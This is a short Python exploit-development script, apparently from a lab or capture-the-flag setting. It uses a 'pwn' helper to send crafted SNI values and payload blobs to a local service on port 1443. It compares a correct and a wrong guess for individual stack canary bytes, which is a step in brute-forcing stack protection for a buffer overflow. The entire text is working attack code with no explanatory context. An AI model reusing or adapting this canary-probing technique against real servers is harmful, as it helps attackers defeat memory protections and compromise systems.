import pwn, sys, re
canary_hex = sys.argv[1]
C = int(canary_hex, 16)
for k in (2, 3):
    c = bytearray(8); c[0] = 0
    for i in range(1, k):
        c[i] = (C >> (8*i)) & 0xff
    # correct
    c2 = bytearray(c); c2[k-1] = (C >> (8*(k-1))) & 0xff
    r1 = pwn.fire('127.0.0.1', 1443, pwn.make_sni(0x58+k), pwn.make_blob(bytes(c2)))
    # wrong
    c3 = bytearray(c); c3[k-1] = ((C >> (8*(k-1))) + 1) & 0xff
    r2 = pwn.fire('127.0.0.1', 1443, pwn.make_sni(0x58+k), pwn.make_blob(bytes(c3)))
    print(f"k={k} correct -> {r1[:40]!r}   wrong -> {r2[:40]!r}")
